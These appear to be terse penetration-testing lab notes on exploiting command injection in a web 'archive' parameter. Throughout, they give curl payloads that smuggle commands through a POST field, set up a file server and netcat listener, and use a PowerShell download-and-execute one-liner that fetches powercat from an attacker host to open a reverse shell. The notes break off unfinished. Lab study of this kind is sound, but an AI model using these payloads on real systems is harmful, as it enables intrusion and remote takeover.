# Command Injection

An example
```bash
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

OKAY I DUNNO LOL
```text
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
injection in http body

curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
continued injection

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444
getting file for upload, hosting http service, and ready to catch rshell


IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive

come back and figure it out, I’m feeling a little lazy right now
```